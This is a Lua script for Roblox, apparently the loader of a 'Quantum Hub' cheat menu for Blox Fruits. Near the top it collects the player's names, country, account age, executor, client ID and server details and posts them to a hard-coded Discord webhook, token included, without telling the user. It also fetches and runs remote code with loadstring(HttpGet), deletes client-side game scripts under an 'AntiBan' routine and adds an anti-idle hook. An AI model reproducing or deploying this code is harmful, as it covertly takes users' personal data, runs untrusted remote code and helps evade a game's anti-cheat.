local LocalizationService = game:GetService("LocalizationService")
local player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")

local pseudoHWID = nil
pcall(function()
    pseudoHWID = game:GetService("RbxAnalyticsService"):GetClientId() 
end)

local gameLink = "https://www.roblox.com/games/" .. game.PlaceId .. "/"

ServerScript = 'game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer("teleport", '..'\''..tostring(game.JobId)..'\''..')'
for i,v in pairs(game.Players:GetPlayers()) do
    CurrentPlayers = i
end

local le = (game:GetService("Players").LocalPlayer.Data.Level.Value)
local code = LocalizationService:GetCountryRegionForPlayerAsync(player)
local data = {
    embeds = {
        {
            title = " New Player",
            url = "https://www.roblox.com/users/" .. player.UserId,
            description = "```" .. player.DisplayName .. " (" .. player.Name .. ") ```",
            color = tonumber(0xffa500),
            author = {
                name = "",
                url = "",
                icon_url = ""
            },
            image = {
            	url = ""
            },
            footer = {
                text = " Time: " .. os.date("%Y-%m-%d %H:%M:%S"),
                icon_url = ""
            },
            fields = {
                {
                    name = "·¥Ñ·¥è·¥ú…¥·¥õ Ä èüåê",
                    value = "```" .. code .. "```",
                    inline = true
                },
                {
                    name = "·¥Ä…¢·¥áüìÜ",
                    value = "```" .. player.AccountAge .. " Days```",
                    inline = true
                },
                {
                    name = "·¥áx·¥á·¥Ñ·¥ú·¥õ·¥è Äüí¨",
                    value = "```" .. identifyexecutor() .. "```",
                    inline = true
                },
                {
                    name = " ü·¥á·¥†·¥á üüÜô:",
                    value = "```" .. le .. "```",
                    inline = true
                },
                {
                    name = "·¥ä·¥è ô …™·¥Ö:",
                    value = "```".. tostring(game.JobId) .."```",
                    inline = true
                },
                {
                    name = "s·¥õ·¥Ä·¥õ·¥ús‚ùó",
                    value = "```Info Got from Main Hub```",
                    inline = true
                },
                {
                    name = "HWID",
                    value = "`" .. (pseudoHWID or "N/A") .. "`",  -- Show pseudo-HWID or "N/A" if unavailable
                    inline = true
                },
            {
                name = "Server Join Script",
                value = '```lua\n'..ServerScript..'\n```',
                inline = true
            },
                {
                    name = "Direct Join",
                    value = gameLink, 
                    inline = true
                }
            }
        }
    }
}

local jsonData = HttpService:JSONEncode(data)
local webhookUrl = "https://discord.com/api/webhooks/1247783062515879947/yJ42T5wW0bTEWMh_Kkbkw-TSd7VrlQJVynZ_Wy4tvF1tQJdvHXMkiYBHHb9cDD9RYjII"
local headers = {["Content-Type"] = "application/json"}
request = http_request or request or HttpPost or fluxus.request or syn.request or Krnl.request or delta.request;
local request = http_request or request or HttpPost or syn.request
local final = {Url = webhookUrl, Body = jsonData, Method = "POST", Headers = headers}

local success, response = pcall(request, final)
if success then
    print("Profile information sent to Discord.")
else
    print("Failed to send profile information to Discord: " .. response)
end


local id = game.PlaceId
if id == 2753915549 then
World1 = true; 
else
if id == 4442272183 then
World2 = true;
else
if id == 7449423635 then 
World3 = true; 
else 
game:Shutdown() 
end
end
end
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
function AntiBan()
    for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
        if v:IsA("LocalScript") then
            if v.Name == "General" or v.Name == "Shiftlock"  or v.Name == "FallDamage" or v.Name == "4444" or v.Name == "CamBob" or v.Name == "JumpCD" or v.Name == "Looking" or v.Name == "Run" then
                v:Destroy()
            end
        end
     end
     for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerScripts:GetDescendants()) do
        if v:IsA("LocalScript") then
            if v.Name == "RobloxMotor6DBugFix" or v.Name == "Clans"  or v.Name == "Codes" or v.Name == "CustomForceField" or v.Name == "MenuBloodSp"  or v.Name == "PlayerList" then
                v:Destroy()
            end
        end
     end
    end
    AntiBan()

game:GetService("Players").LocalPlayer.Idled:connect(function()
	game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
	wait(1)
	game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)

spawn(function() 
    repeat
        task.wait()
    until game:IsLoaded()
    repeat
        task.wait()
    until game.Players
    repeat
        task.wait()
    until game.Players.LocalPlayer and game.Players.LocalPlayer.Team ~= nil 
    wait(1.5)
    require(game.ReplicatedStorage.Notification).new("<Color=Red>Welcome Quantum Hub User<Color=/>"):Display()
end)
wait(1.5)
require(game.ReplicatedStorage.Notification).new("<Color=Red>Loading<Color=/>"):Display()
    

local Quantum = loadstring(game:HttpGet("https://raw.githubusercontent.com/FlazhGG/Quantum-V2/main/QuantumHubLibrary"))()

local Window = Quantum:CreateWindow({
    Title = "Quantum Hub",
    SubTitle = "BloxFruit",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 430),
    Acrylic = false, -- The blur may be detectable, setting this to false disables blur entirely
    Theme = "Quantum",
    MinimizeKey = Enum.KeyCode.LeftControl -- Used when theres no MinimizeKeybind
})

task.spawn(function()
    local originalWarn = warn
    local originalError = error
    local originalRconsolewarn = rconsolewarn
    local originalRconsoleerr = rconsoleerr
    local originalPrint = print

    -- Override functions to suppress output
    warn = function() end
    error = function() end
    rconsolewarn = function() end
    rconsoleerr = function() end
    print = function() end 

    -- Loop and destroy effects (error-safe)
    pcall(function()  -- Use pcall to handle potential errors
        for _, effect in pairs(game:GetService("ReplicatedStorage").Effect.Container:GetChildren()) do
            if effect.Name == "Death" or effect.Name == "Spawn" then
                effect:Destroy()
            end
        end
    end)

    -- Restore original functions (optional, for debugging)
    warn = originalWarn
    error = originalError
    rconsolewarn = originalRconsolewarn
    rconsoleerr = originalRconsoleerr
    print = originalPrint
end)

local Info = Window:AddTab({Title = "Info", Icon = "crown"})


local Time = Info:AddParagraph({Title = "", Content = ""})
local OSDate = Info:AddParagraph({Title = "", Content = ""})

local function UpdateOS()
    local date = os.date("*t")
    local hour = (date.hour) % 24
    local ampm = hour < 12 and "AM" or "PM"
    local timezone = string.format("%02i:%02i:%02i %s", ((hour -1) % 12) + 1, date.min, date.sec, ampm)
    local datetime = string.format("%02d/%02d/%04d", date.day, date.month, date.year)
    local LocalizationService = game:GetService("LocalizationService")
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    local name = player.Name
    local result, code = pcall(function()
     return LocalizationService:GetCountryRegionForPlayerAsync(player)
     end)
     OSDate:SetTitle(datetime.." - "..timezone.." [" .. code .. "]")
    end
    spawn(function()
     while true do
     UpdateOS()
     game:GetService("RunService").RenderStepped:Wait()
     end
     end)

     function UpdateTime()
        local GameTime = math.floor(workspace.DistributedGameTime+0.5)
        local Hour = math.floor(GameTime/(60^2))%24
        local Minute = math.floor(GameTime/(60^1))%60
        local Second = math.floor(GameTime/(60^0))%60
        Time:SetTitle("[Sever Time]: Hours: "..Hour.." Min: "..Minute.." Sec: "..Second)
        end
        
        spawn(function()
        while task.wait() do
        pcall(function()
        UpdateTime()
        end)
        end
        end)


        Info:AddButton({
            Title = "Discord Server Link",
            Description = "",
            Callback = function()
                Window:Dialog({
                    Title = "Quantum Community",
                    Content = "Discord server, Invite link",
                    Buttons = {
                        {
                            Title = "Copy",
                            Callback = function()
                                setclipboard("https://discord.gg/jVPx7qzt4U")
                                Quantum:Notify({
                                    Title = "Quantum Hub",
                                    Content = "Invited",
                                    SubContent = "Enjoy Using Quantum Hub", -- Optional
                                    Duration = 2 -- Set to nil to make the notification not disappear
                                })                            
                            end
                        },
                        {
                            Title = "Cancel",
                            Callback = function()
                                print("Cancelled the dialog.")
                            end
                        }
                    }
                })
            end
        })

        require(game.ReplicatedStorage.Notification).new("<Color=Red>Fully loaded<Color=/>"):Display()
